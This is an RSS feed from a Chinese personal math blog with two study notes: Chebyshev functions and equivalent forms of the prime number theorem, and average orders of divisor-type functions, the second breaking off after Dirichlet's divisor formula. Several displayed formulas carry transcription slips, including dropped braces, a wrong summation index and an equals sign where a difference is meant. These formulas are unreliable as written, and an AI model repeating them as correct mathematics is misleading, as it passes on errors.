<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on DorinXL-荡影</title>
        <link>https://dorinxl.github.io/post/</link>
        <description>Recent content in Posts on DorinXL-荡影</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>荡影-DorinXL</copyright>
        <lastBuildDate>Sat, 23 Sep 2023 12:15:00 +0000</lastBuildDate><atom:link href="https://dorinxl.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>素数分布的基本定理（一）</title>
        <link>https://dorinxl.github.io/p/%E7%B4%A0%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9A%E7%90%86%E4%B8%80/</link>
        <pubDate>Sat, 23 Sep 2023 12:15:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%B4%A0%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9A%E7%90%86%E4%B8%80/</guid>
        <description>&lt;img src="https://dorinxl.github.io/p/%E7%B4%A0%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9A%E7%90%86%E4%B8%80/number%20theory.jpg" alt="Featured image of post 素数分布的基本定理（一）" /&gt;&lt;h1 id=&#34;素数分布的基本定理一&#34;&gt;素数分布的基本定理（一）
&lt;/h1&gt;


&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34; fill=&#34;hsl(30, 80%, 70%)&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;本文使用&lt;strong&gt;Typora&lt;/strong&gt;编写，但Hugo使用&lt;strong&gt;KaTex&lt;/strong&gt;渲染，可能会出现不兼容状态，如需最佳体验请前往&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/DorinXL/p/17724744.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;目录&#34;&gt;目录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Chapter1 切比雪夫函数$\psi(x)$和$\vartheta(x)$&lt;/li&gt;
&lt;li&gt;Chapter2 $\vartheta(x)$与$\pi(x)$的关系&lt;/li&gt;
&lt;li&gt;Chapter3 素数定理的等价形式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter1-切比雪夫函数psix和varthetax&#34;&gt;Chapter1 切比雪夫函数$\psi(x)$和$\vartheta(x)$
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;对于$x&amp;gt;1$，$\psi(x)$定义为：
$$
\psi(x) = \sum_{n\le x}\Lambda(n) = \sum_{m\le \log_2{x}}\sum_{p\le x^{1/m}}\log{p}
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对于$x&amp;gt;0$，$\vartheta(x)$定义为：
$$
\vartheta(x) = \sum_{p\le x}\log{p}
$$&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1:Mangoldt函数$\Lambda(n)$的变化，即为什么：
$$
\sum_{n\le x}\Lambda(n) = \sum_{m\le \log_2{x}}\sum_{p\le x^{1/m}}\log{p}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;根据$\Lambda(n)$函数的定于，如果$n$不是某个素数的幂，那么$\Lambda(n)=0$。&lt;/p&gt;
&lt;p&gt;于是我们可以将$\sum_{n\le x}\Lambda(n)$表示为
$$
\sum_{n\le x}\Lambda(n) =\sum_{m=1}^{\infty}\sum_{p^m\le x}\Lambda(p^m) = \sum_{m=1}^{\infty}\sum_{p\le x^{1/m}}\log p
$$
关于后面的那个sum，其中的$p,x,m$三者形成了一个关系。实际上，p是从2开始的，也就是说$x^{1/m}&amp;lt;2$的话，sum是0。&lt;/p&gt;
&lt;p&gt;我们将$x^{1/m}&amp;lt;2$这个条件进行变换：
$$
x^{1/m}&amp;lt;2\newline
\dfrac{1}{m}\log x &amp;lt; \log 2\newline
m &amp;gt; \dfrac{\log x}{\log 2} = \log_2{x}
$$
于是我们得到了m和x的一个关系，于是就可以将前面sum的无穷转换为新的形式：
$$
\sum_{m=1}^{\infty}\sum_{p\le x^{1/m}}\log p = \sum_{m\le \log_2{x}}\sum_{p\le x^{1/m}}\log p
$$
有了这样的形式，我们也可以将$\psi(x)$与$\vartheta(x)$联系起来：
$$
\psi(x) = \sum_{m\le \log_2{x}}\vartheta(x^{1/m})
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2:关于$\dfrac{\psi(x)}{x}$与$\dfrac{\vartheta(x)}{x}$两者之间的关系：其中一个趋于一个极限，那么另一个也趋于这个极限。也就是说：
$$
\lim_{x\rightarrow\infty}(\dfrac{\psi(x)}{x}-\dfrac{\vartheta(x)}{x})=0
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;通过$\psi(x)$与$\vartheta(x)$的关系我们可以得到一个减法：
$$
\psi(x) - \vartheta(x) = \sum_{m\le \log_2{x}}\vartheta(x^{1/m}) - \vartheta(x) = \sum_{1 \le m \le \log_2{x}}\vartheta(x^{1/m})
$$
现在目光聚集到$\vartheta$上，对于$\vartheta$的定义，我们可以写出不等式：
$$
\vartheta(x) = \sum_{p\le x}\log p \le x \log p
$$
于是有
$$
\begin{align*}
0 \le \psi(x)-\vartheta(x) \le \sum_{2\le m \le \log_2x}x^{1/m}\log x^{1/m}\newline
\end{align*}\newline
$$
将其扩大，放缩为
$$
\sum_{2\le m \le \log_2x}\log x^{1/m} \le (\log_2 x)\sqrt{x}\log\sqrt{x} \newline
= \dfrac{\log x}{\log 2}\dfrac{\sqrt{x}}{2}\log x \newline
= \dfrac{\sqrt{x}(\log x)^2}{2\log 2}
$$
同时去除x最后得到：
$$
0\le \dfrac{\psi(x)}{x} = \dfrac{\vartheta(x)}{x}\le \dfrac{(\log x)^2}{2\sqrt{x}\log2}
$$
根据夹逼定理：
$$
\begin{align*}
\lim_{x\rightarrow\infty} \dfrac{(\log x)^2}{2\sqrt{x}\log2}
&amp;amp;= \dfrac{1}{2\log2}\lim_{x\rightarrow\infty}\dfrac{(\log x)^2}{\sqrt{x}} \newline
&amp;amp;=\dfrac{1}{2\log2}\lim_{x\rightarrow\infty}\dfrac{4\log x}{\sqrt{x}} \newline
&amp;amp;=\dfrac{2}{\log2}\lim_{x\rightarrow\infty}\dfrac{2}{\sqrt{x}} \newline
&amp;amp;=0
\end{align*}
$$
可以得出
$$
\lim_{x\rightarrow\infty}(\dfrac{\psi(x)}{x}-\dfrac{\vartheta(x)}{x})=0
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter2--varthetax与pix的关系&#34;&gt;Chapter2  $\vartheta(x)$与$\pi(x)$的关系
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1:（阿贝尔等式）对任一数论函数$a(n)$，令其部分和为
$$
A(x) = \sum_{n\le x}a(n)
$$
当$x&amp;lt;1$时，$A(x)=0$。如果函数$f$在区间$[y，x],(0&amp;lt;y&amp;lt;x)$上有连续导数，那么有：
$$
\sum_{y&amp;lt;n\le x}a(n)f(n) = A(x)f(x)-A(y)f(y)-\int_{y}^{x}A(t)f&amp;rsquo;(t)dt
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;令$k = \lfloor x\rfloor,m = \lfloor y\rfloor$。这样一来$A(k)=A(x),A(m)=A(y)$
$$
\begin{align*}
\sum_{y&amp;lt;n\le x}a(n)f(n)&amp;amp;=\sum_{n=m+1}^ka(n)f(n)\newline
&amp;amp;=\sum_{n=m+1}^k{A(n)-A(n-1)}f(n)\newline
&amp;amp;=\sum_{n=m+1}^kA(n)f(n)  -\sum_{n=m}^{k-1}A(n)f(n+1)\newline
&amp;amp;=\sum_{n=m+1}^{k-1}A(n)f(n)+A(k)f(k)-\sum_{n=m}^{k-1}A(n)f(n+1)\newline
&amp;amp;=\sum_{n=m+1}^{k-1}A(n){f(n)-f(n+1)}+A(k)f(k)-A(m)f(m+1)\newline
&amp;amp;=-\sum_{n=m+1}^{k-1}A(n)\int_{n}^{n+1}f&amp;rsquo;(t)dt+A(k)f(k)-A(m)f(m+1)\newline
&amp;amp;=-\sum_{n=m+1}^{k-1}\int_{n}^{n+1}A(t)f&amp;rsquo;(t)dt+A(k)f(k)-A(m)f(m+1)\newline
&amp;amp;=-\int_{m+1}^{k}A(t)f&amp;rsquo;(t)dt+A(k)f(k)-A(m)f(m+1)\newline
用同样的思想向着\int_y^x出发：
&amp;amp;=-\int_{m+1}^{k}A(t)f&amp;rsquo;(t)dt-{\int_k^xA(t)f&amp;rsquo;(t)dt+A(k)f(x)}-{\int_y^m+1A(t)f&amp;rsquo;(t)dt+A(m)f(y)}\newline
&amp;amp;=A(x)f(x)-A(y)f(y)-\int_y^xA(t)f&amp;rsquo;(t)dt
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2:接下来我们分别用$\pi(x)$将$\vartheta(x)$表示出来，再用$\vartheta(x)$将$\pi(x)$表示出来：
$$
\vartheta(x) = \pi(x)\log x-\int_2^x\dfrac{\pi(t)}{t}dt\newline
和\newline
\pi(x) = \dfrac{\vartheta(x)}{\log x}+\int_2^x\dfrac{\vartheta(t)}{t\log^2t}dt
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;我们知道，$\pi(x)$计算的是小于等于x的范围内有多少个素数，如果用求和的形式将其表示出来的话就是$\pi(x) = \sum_{p\le x}1$，我们可以用一个特征函数表示:
$$
a(n) =
\begin{cases}
1,若n是素数\newline
0,其他
\end{cases}
$$
所以$\pi(x) = \sum_{p\le x}1 = \sum_{1&amp;lt;n\le x}a(n)$&lt;/p&gt;
&lt;p&gt;基于这个特征函数也可以将$\vartheta(x)$表示成$\vartheta(x) = \sum_{p\le x}\log p= \sum_{1&amp;lt;n\le x}a(n)\log n$&lt;/p&gt;
&lt;p&gt;这两个函数在配合上面的阿贝尔等式，$f(n) = \log n $,我们就可以得到：
$$
\vartheta(x) = \pi(x)\log{x}-\pi(1)\log{1}-\int_1^x\pi(t)(\log t)&amp;lsquo;dt
$$
当t&amp;lt;2的时候，$\pi(t)=0$，于是最终形式如下：
$$
\vartheta(x) = \pi(x)\log{x}-\int_2^x\dfrac{\pi(t)}{t}dt
$$
接下来对$\pi(x)$进行转换。&lt;/p&gt;
&lt;p&gt;如果我们想用$\vartheta(x)$将$\pi(x)$表示出来，可以用$b(n)=a(n)\log n$将$\vartheta(x)$表示为部分和$\vartheta(x)=\sum_{n\le x}b(n)$的形式，然后就可以使用$f(n)=\dfrac{1}{\log n}$阿贝尔等式展开了：
$$
\pi(x) = \sum_{y&amp;lt;n\le x}b(n)\dfrac{1}{\log n} = b(x)\dfrac{1}{\log x}-b(y)\dfrac{1}{\log y} - \int_y^xb(t)(\dfrac{1}{\log t})&amp;lsquo;dt
$$
展开后得到：
$$
\pi(x) =\vartheta(x)\dfrac{1}{\log x}-\vartheta(y)\dfrac{1}{\log y} + \int_y^x\dfrac{\vartheta(t)}{t\log^2 t}dt
$$
当$0&amp;lt;y&amp;lt;2$时，$\vartheta(y)=0$，最终我们得到：
$$
\pi(x) =\vartheta(x)\dfrac{1}{\log x} + \int_2^x\dfrac{\vartheta(t)}{t\log^2 t}dt
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter3-素数定理的等价形式&#34;&gt;Chapter3 素数定理的等价形式
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1:下面这几个式子是等价的
$$
\begin{equation*}
\lim_{x\rightarrow\infty}\dfrac{\pi(x)\log x}{x}=1\newline
\lim_{x\rightarrow\infty}\dfrac{\vartheta(x)}{x}=1\newline
\lim_{x\rightarrow\infty}\dfrac{\psi(x)}{x}=1
\end{equation*}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;由C2.Th2得到
$$
\dfrac{\vartheta(x)}{x} = \dfrac{\pi(x)\log x}{x}-\dfrac{1}{x}\int_2^x\dfrac{\pi(t)}{t}dt\newline
和\newline
\dfrac{\pi(x)\log x}{x} = \dfrac{\vartheta(x)}{x}+\dfrac{\log x}{x}\int_2^x\dfrac{\vartheta(t)}{t\log^2t}dt
$$
证明$\dfrac{\vartheta(x)}{x}$和$\dfrac{\pi(x)\log x}{x}$的等价关系，只需要分别证明：&lt;/p&gt;
&lt;p&gt;（1）&lt;strong&gt;$\lim_{x\rightarrow\infty}\dfrac{1}{x}\int_2^x\dfrac{\pi(t)}{t}dt=0$:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过第一个式子我们可以得到$\dfrac{\pi(x)}{x}=\Omicron(\dfrac{1}{\log x})$，于是
$$
\dfrac{1}{x}\int_2^x\dfrac{\pi(t)}{t}dt = \Omicron(\dfrac{1}{x}\int_2^x\dfrac{1}{\log t}dt)\newline
\int_2^x\dfrac{1}{\log t}dt = \int_2^{\sqrt x}\dfrac{1}{\log t}dt + \int_{\sqrt x}^x\dfrac{1}{\log t}dt \le \dfrac{\sqrt{x}}{\log 2}+\dfrac{x-\sqrt{x}}{\log \sqrt{x}}
$$
乘起来
$$
\dfrac{1}{x}\int_2^x\dfrac{\pi(t)}{t}dt \le \dfrac{1}{x}{\dfrac{\sqrt{x}}{\log 2}+\dfrac{x-\sqrt{x}}{\log \sqrt{x}}}=\dfrac{1}{\sqrt{x}\log 2}+\dfrac{1-\dfrac{1}{\sqrt{x}}}{\log \sqrt{x}}\newline
\lim_{x\rightarrow\infty}{\dfrac{1}{\sqrt{x}\log 2}+\dfrac{1-\dfrac{1}{\sqrt{x}}}{\log \sqrt{x}}} = 0\newline
所以\lim_{x\rightarrow\infty}\dfrac{1}{x}\int_2^x\dfrac{\pi(t)}{t}dt \rightarrow0
$$
（2）&lt;strong&gt;$\lim_{x\rightarrow\infty}\dfrac{\log x}{x}\int_2^x\dfrac{\vartheta(t)}{t\log^2t}dt=0$：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过第二个式子我们可以得到$\vartheta(t)=\Omicron(t)$，于是
$$
\dfrac{\log x}{x}\int_2^x\dfrac{\vartheta(t)}{t\log^2t}dt = \Omicron(\dfrac{\log x}{x}\int_2^x\dfrac{1}{\log^2t}dt)\newline
\int_2^x\dfrac{1}{\log^2t}dt = \int_2^{\sqrt{x}}\dfrac{1}{\log^2t}dt + \int_{\sqrt{x}}^x\dfrac{1}{\log^2t}dt\le
\dfrac{\sqrt{x}}{\log^22}+\dfrac{x-\sqrt{x}}{\log^2\sqrt{2}}
$$
乘起来
$$
\dfrac{\log x}{x}\int_2^x\dfrac{\vartheta(t)}{t\log^2t}dt \le
\dfrac{\log x}{x}{\dfrac{\sqrt{x}}{\log^22}+\dfrac{x-\sqrt{x}}{\log^2\sqrt{x}}} =
\dfrac{\log x}{\sqrt{x}\log^22}+\dfrac{2(1-\dfrac{1}{\sqrt{x}})}{\log\sqrt{x}}\newline
lim_{x\rightarrow\infty}{\dfrac{\log x}{\sqrt{x}\log^22}+\dfrac{2(1-\dfrac{1}{\sqrt{x}})}{\log\sqrt{x}}} =0\newline
所以：lim_{x\rightarrow\infty}\dfrac{\log x}{x}\int_2^x\dfrac{\vartheta(t)}{t\log^2t}dt \rightarrow0
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2:接下来我们将素数定理和第n个素数的渐进值联系起来**:令$p_n$是第n个素数**，下面几个渐进式是逻辑等价的。
$$
\begin{gather}
\lim_{x\rightarrow\infty}\dfrac{\pi(x)\log x}{x} = 1 \newline
\lim_{x\rightarrow\infty}\dfrac{\pi(x)\log{\pi(x)}}{x} = 1 \newline
\lim_{n\rightarrow\infty}\dfrac{p_n}{n\log n } = 1
\end{gather}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一个式子推第二个：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对第一个式子两边取对数得
$$
\lim_{x\rightarrow\infty}[\log{\pi(x)}+\log{\log x}-\log{x}]=0 \newline
\lim_{x\rightarrow\infty}\log x[{\dfrac{{\log \pi(x)}}{\log{x}}+\dfrac{\log{\log x}}{\log{x}}-1}]=0
$$
当$x\rightarrow\infty$时，前面的$\log x\rightarrow\infty$，于是后面的$\lim_{x\rightarrow\infty}[{\dfrac{{\log\pi(x)}}{\log{x}}+\dfrac{\log{\log x}}{\log{x}}-1}]=0$。然而中间的又是0&lt;/p&gt;
&lt;p&gt;即$\lim_{x\rightarrow\infty}{\dfrac{{\log\pi(x)}}{\log{x}}}=1$&lt;/p&gt;
&lt;p&gt;于是$\lim_{x\rightarrow\infty}{\dfrac{{\log\pi(x)}}{\log{x}}\dfrac{\pi(x)\log x}{x}}=\lim_{x\rightarrow\infty}\dfrac{\pi(x)\log x}{x}=1$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二个式子推第三个：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;$p_n$是第n个素数，我们用x表示$p_n$。那么$\pi(x)=n，\pi(x)\log\pi(x) = n\log n$&lt;/p&gt;
&lt;p&gt;于是$\lim_{x\rightarrow\infty}\dfrac{\pi(x)\log{\pi(x)}}{x} = \lim_{x\rightarrow\infty}\dfrac{n\log n}{p_n}=1$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三个式子推第二个：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;式3成立，给定x，由不等式$p_n\le x &amp;lt; p_{n+1}$确定n，$n=\pi(x)$，于是有不等式：
$$
\dfrac{p_n}{n\log n} \le \dfrac{x}{n\log n } &amp;lt; \dfrac{p_{n+1}}{n\log n}=\dfrac{p_{n+1}}{(n+1)\log{(n+1)}}\dfrac{(n+1)\log{(n+1)}}{n\log n}
$$
如此一来就构成了满足式3的$p_n,p_{n+1}$，根据夹逼可以知道$\lim_{x\rightarrow\infty}\dfrac{x}{n\log n}=1$&lt;/p&gt;
&lt;p&gt;将n替换为$\pi(x)$就得到了式2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二个式子推第一个：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对式2取对数得
$$
\lim_{x\rightarrow\infty}[\log\pi(x) + \log \log{\pi(x)} - \log x] = 0  \newline
\lim_{x\rightarrow\infty}\log\pi(x)[1+\dfrac{\log\log\pi(x)}{\log\pi(x)}-\dfrac{\log x}{\log\pi(x)}] = 0  \newline
$$
外面的$\log\pi(x)\rightarrow\infty$，那么里面的就有$\lim_{x\rightarrow\infty}1+\dfrac{\log\log\pi(x)}{\log\pi(x)}-\dfrac{\log x}{\log\pi(x)} = 0 $，中间的$\lim_{x\rightarrow\infty}\dfrac{\log\log\pi(x)}{\log x}=0$&lt;/p&gt;
&lt;p&gt;于是剩下的$\lim_{x\rightarrow\infty}\dfrac{\log x}{\log\pi(x)}=1$&lt;/p&gt;
&lt;p&gt;结合式2得到$\lim_{x\rightarrow\infty}\dfrac{\log x}{\log\pi(x)}\dfrac{\pi(x)\log\pi(x)}{x}=\dfrac{\pi(x)\log x}{x}=1$&lt;/p&gt;
&lt;p&gt;于是证出第一个式子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>几个函数的平均阶</title>
        <link>https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/</link>
        <pubDate>Sat, 23 Sep 2023 12:14:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/</guid>
        <description>


&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34; fill=&#34;hsl(30, 80%, 70%)&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;本文使用&lt;strong&gt;Typora&lt;/strong&gt;编写，但Hugo使用&lt;strong&gt;KaTex&lt;/strong&gt;渲染，可能会出现不兼容状态，如需最佳体验请前往&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/DorinXL/p/17724738.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;h1 id=&#34;几个函数的平均阶&#34;&gt;几个函数的平均阶
&lt;/h1&gt;&lt;h2 id=&#34;目录&#34;&gt;目录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Chapter1 $d(n)$的平均阶&lt;/li&gt;
&lt;li&gt;Chapter2 除数函数$\sigma_\alpha(n)$的平均阶&lt;/li&gt;
&lt;li&gt;Chapter3 $\mu(n)$和$\Lambda(n)$的平均阶&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter1-dn的平均阶&#34;&gt;Chapter1 $d(n)$的平均阶
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1:**对所有$x\ge1$，我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{n\le x}d(n)=x\log x+(2C-1)x+\Omicron(\sqrt x)
$$&lt;/p&gt;
&lt;p&gt;其中C是欧拉常数&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;我们知道，$d(n)=\sum_{d|n}1$，所以我们有
$$
\sum_{n\le x}d(n)=\sum_{n\le x}\sum_{d|n}1
$$
我们把$n=qd$，那么对于$q,d$展开就变成了
$$
\sum_{n\le x}d(n)=\sum_{q,d \newline qd\le x}1
$$
结合图像我们可以形象的明白，我们取的点即是在$qd$平面上的一些格点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/1858293-20230923170758581-1917446611.png&#34;
	width=&#34;479&#34;
	height=&#34;438&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/1858293-20230923170758581-1917446611_hu7079173478167870897.png 480w, https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/1858293-20230923170758581-1917446611_hu6419852671196703390.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20230817171835151&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;109&#34;
		data-flex-basis=&#34;262px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;也就是当n=1，2，&amp;hellip;，[x]时，曲线qd=n上的格点的个数。&lt;/p&gt;
&lt;p&gt;我们固定每一个小于x的$d$，计算水平上q可以取的格点的数目，然后对于所有的$d\le x$求和，最终得到：
$$
\sum_{n\le x}d(n)=\sum_{d\le x}\sum_{q\le\frac{x}{d}}1
$$
根据欧拉求和公式，我们可以得到
$$
\sum_{q\le\frac{x}{d}}1=\dfrac{x}{d}+\Omicron(1)
$$
继续用欧拉求和公式，得到、
$$
\begin{align*}
\sum_{n\le x}d(n)&amp;amp;=\sum_{d\le x}\sum_{q\le\frac{x}{d}}1 \newline
&amp;amp;=\sum_{d\le x}{\dfrac{x}{d}+\Omicron(1)} \newline
&amp;amp;=x\sum_{d\le x}\dfrac{1}{d}+\Omicron(x) \newline
&amp;amp;=x{\log x+C+\Omicron(\dfrac{1}{x})}+\Omicron(x) \newline
&amp;amp;=x\log x+\Omicron(x)
\end{align*}
$$
由此得出$\sum_{n\le x}d(n) \sim x\log x,x\rightarrow\infty$&lt;/p&gt;
&lt;p&gt;我们可以加强这个式子，还是从图片入手，我们换个思路：利用对称性，格点的总数等于在直线$q=d$下面的格点数的2倍加上这条线上的格点数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/1858293-20230923170759175-363398253.png&#34;
	width=&#34;352&#34;
	height=&#34;309&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/1858293-20230923170759175-363398253_hu10239322368568398480.png 480w, https://dorinxl.github.io/p/%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%B9%B3%E5%9D%87%E9%98%B6/1858293-20230923170759175-363398253_hu16696176443755543962.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20230817173942375&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;113&#34;
		data-flex-basis=&#34;273px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;既然qd=n，我们更关注q=d这条线，那么遍历d从1到$[\sqrt x]$，每固定d，那么q就有$[\sqrt\frac{x}{d}]$个格点可以选择，那么阴影区域的格点数为$[\dfrac{x}{d}]-d$个。&lt;/p&gt;
&lt;p&gt;于是我们得到新的式子
$$
\sum_{n\le x}d(n)=2\sum_{d\le\sqrt x}{[\dfrac{x}{d}]-d}+[\sqrt x]
$$
利用$[y]=y+\Omicron(1)$和求和公式的推论得到
$$
\begin{align*}
\sum_{n\le x}d(n)&amp;amp;=2\sum_{d\le\sqrt x}{[\dfrac{x}{d}]-d}+[\sqrt x] \newline
&amp;amp;=2\sum_{d\le\sqrt x}{\dfrac{x}{d}-d+\Omicron(1)}+\Omicron(\sqrt x) \newline
&amp;amp;=2x\sum_{d\le\sqrt x}\dfrac{1}{d}-2\sum_{d\le\sqrt x}d+\Omicron(\sqrt x) \newline
&amp;amp;=2x{\log \sqrt x+C+\Omicron(\dfrac{1}{\sqrt x})}-2{\dfrac{x}{2}+\Omicron(\sqrt x)}+\Omicron(\sqrt x) \newline
&amp;amp;=x\log x+(2C-1)x+\Omicron(\sqrt x)
\end{align*}
$$
这就是除数函数$d(n)$的部分和的迪利克雷渐进公式。&lt;/p&gt;
&lt;p&gt;Dirichlet&amp;rsquo;s asymptotic formula for the partial sums of the divisor function d(n).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
